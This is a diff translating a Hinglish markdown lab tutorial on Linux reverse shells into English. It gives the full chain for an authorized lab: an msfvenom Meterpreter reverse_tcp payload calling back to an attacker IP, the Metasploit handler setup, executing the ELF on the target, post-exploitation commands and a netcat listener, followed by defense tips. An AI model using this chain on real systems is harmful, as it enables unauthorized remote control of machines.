@@ -1,34 +1,34 @@
 # 🛡️ Practical 2 – Linux Reverse Shell
 
-Aaj hum ek **basic Linux reverse shell lab practical** dekhenge jisme:
+Today we will understand a **basic Linux reverse shell lab practical** where we will:
 
-✔ Linux payload generate karna
-✔ File executable banana (`chmod +x`)
-✔ Metasploit handler setup karna
-✔ Reverse Meterpreter session establish karna
+✔ Generate a Linux payload
+✔ Make the file executable (`chmod +x`)
+✔ Set up a Metasploit handler
+✔ Establish a reverse Meterpreter session
 
-⚠️ Ye practical sirf **authorized lab environment (Kali + Linux VM)** ke liye hai.
+⚠️ This practical is only for an **authorized lab environment (Kali + Linux VM)**.
 
 ---
 
 # 1️⃣ Basic Concept 📌
 
-## 📌 Reverse Shell Kya Hota Hai?
+## 📌 What is a Reverse Shell?
 
-Reverse shell me:
+In a reverse shell:
 
-👉 Target machine attacker machine ko connect karti hai.
+👉 The target machine connects to the attacker machine.
 
-Matlab:
+Meaning:
 
-* Attacker wait karta hai
-* Target khud connection initiate karta hai
+* Attacker waits
+* Target itself initiates the connection
 
 ---
 
 ## 🧠 Flow Diagram
 
-```text id="0xt5h2"
+```text
 Attacker (Kali)  <------  Linux Target
    Listener           Reverse Connection
 ```
@@ -49,18 +49,18 @@ Attacker (Kali)  <------  Linux Target
 
 ## 📌 Check IP
 
-```bash id="4gm2zc"
+```bash
 ip a
 ```
 
 Example Output:
 
-```text id="khikgc"
+```text
 192.168.1.10
 ```
 
-👉 Ye attacker IP hai
-👉 Isko hum **LHOST** bolte hain.
+👉 This is the attacker IP
+👉 This is what we call **LHOST**.
 
 ---
 
@@ -68,7 +68,7 @@ Example Output:
 
 ## 📌 Payload Generation (msfvenom)
 
-```bash id="l4i2ln"
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp \
 LHOST=192.168.1.10 \
 LPORT=4444 \
@@ -93,8 +93,8 @@ LPORT=4444 \
 
 # 📌 Output
 
-✔ `shell.elf` file generate hoti hai
-✔ Ye Linux executable payload hota hai
+✔ `shell.elf` file is generated
+✔ This is the Linux executable payload
 
 ---
 
@@ -102,7 +102,7 @@ LPORT=4444 \
 
 ## 📌 Open Metasploit
 
-```bash id="vcjn0x"
+```bash
 msfconsole
 ```
 
@@ -112,7 +112,7 @@ msfconsole
 
 ## 📌 Use Multi Handler
 
-```bash id="2fzv1h"
+```bash
 use exploit/multi/handler
 ```
 
@@ -120,7 +120,7 @@ use exploit/multi/handler
 
 ## 📌 Set Payload
 
-```bash id="lqvqk9"
+```bash
 set payload linux/x86/meterpreter/reverse_tcp
 ```
 
@@ -128,11 +128,11 @@ set payload linux/x86/meterpreter/reverse_tcp
 
 ## 📌 Set Network Settings
 
-```bash id="j8jtrr"
+```bash
 set LHOST 192.168.1.10
 ```
 
-```bash id="5k7qmy"
+```bash
 set LPORT 4444
 ```
 
@@ -140,13 +140,13 @@ set LPORT 4444
 
 # 7️⃣ Start Listener ▶️
 
-```bash id="j6l38j"
+```bash
 exploit
 ```
 
 or
 
-```bash id="i89av4"
+```bash
 run
 ```
 
@@ -154,7 +154,7 @@ run
 
 ## 📌 Status
 
-✔ Metasploit ab reverse connection ka wait karega
+✔ Metasploit will now wait for the reverse connection
 
 ---
 
@@ -162,7 +162,7 @@ run
 
 ## 📌 Methods
 
-Payload ko Linux target machine me transfer kar sakte ho:
+You can transfer the payload to the Linux target machine using:
 
 ✔ USB
 ✔ Shared folder
@@ -172,7 +172,7 @@ Payload ko Linux target machine me transfer kar sakte ho:
 
 Example filename:
 
-```text id="48z5y5"
+```text
 shell.elf
 ```
 
@@ -180,13 +180,13 @@ shell.elf
 
 # 9️⃣ Make File Executable 🔓
 
-Linux me executable permission dena zaruri hota hai.
+In Linux, it is necessary to give executable permission.
 
 ---
 
 ## ⚙️ Command
 
-```bash id="kv8k8u"
+```bash
 chmod +x shell.elf
 ```
 
@@ -206,7 +206,7 @@ chmod +x shell.elf
 
 ## 📌 Run File
 
-```bash id="w0mtjf"
+```bash
 ./shell.elf
 ```
 
@@ -223,9 +223,9 @@ chmod +x shell.elf
 
 # 1️⃣1️⃣ Successful Connection 🔗
 
-Agar sab sahi hua to Metasploit me output aayega:
+If everything is correct, Metasploit will show output:
 
-```text id="n5a2qg"
+```text
 Meterpreter session opened
 ```
 
@@ -235,7 +235,7 @@ Meterpreter session opened
 
 ## 📌 System Information
 
-```bash id="75qqzw"
+```bash
 sysinfo
 ```
 
@@ -243,7 +243,7 @@ sysinfo
 
 ## 📌 Current User
 
-```bash id="1r5tfx"
+```bash
 getuid
 ```
 
@@ -251,7 +251,7 @@ getuid
 
 ## 📌 Current Directory
 
-```bash id="c7alj0"
+```bash
 pwd
 ```
 
@@ -259,7 +259,7 @@ pwd
 
 ## 📌 File Listing
 
-```bash id="2m1vgn"
+```bash
 ls
 ```
 
@@ -267,7 +267,7 @@ ls
 
 ## 📌 Open Linux Shell
 
-```bash id="73qjvx"
+```bash
 shell
 ```
 
@@ -275,9 +275,9 @@ shell
 
 # 1️⃣3️⃣ Netcat Listener (Alternative) 📡
 
-Agar simple TCP listener test karna ho:
+If you want to test a simple TCP listener:
 
-```bash id="e9j0zw"
+```bash
 nc -lvp 4444
 ```
 
@@ -296,7 +296,7 @@ nc -lvp 4444
 
 # 📌 Overall Attack Flow Summary 🔥
 
-```text id="s6wxyh"
+```text
 1. Find attacker IP
 2. Generate Linux payload
 3. Start Metasploit handler
@@ -323,7 +323,7 @@ nc -lvp 4444
 
 ## 📌 Defense Methods
 
-✔ Don’t execute unknown ELF files
+✔ Don't execute unknown ELF files
 ✔ Restrict executable permissions
 ✔ Monitor reverse connections
 ✔ Use endpoint security tools
@@ -334,21 +334,21 @@ nc -lvp 4444
 # 🎯 Interview Questions
 
 ✔ What is reverse TCP payload?
-✔ Why `chmod +x` required in Linux?
+✔ Why is `chmod +x` required in Linux?
 ✔ Difference between ELF and EXE?
-✔ Why handler and payload must match?
+✔ Why must the handler and payload match?
 ✔ Meterpreter advantages?
 
 ---
 
 # 🏁 Final Thought
 
-Ye practical Linux exploitation ka foundational concept hai:
+This practical is a foundational concept of Linux exploitation:
 
 👉 Payload generation
 👉 Executable permissions
 👉 Reverse TCP communication
 👉 Meterpreter session handling
 
-Agar ye clear ho gaya →
-Advanced Linux penetration testing aur post-exploitation concepts easy ho jate hain 🔥
+If this is clear →
+Advanced Linux penetration testing and post-exploitation concepts become easier 🔥
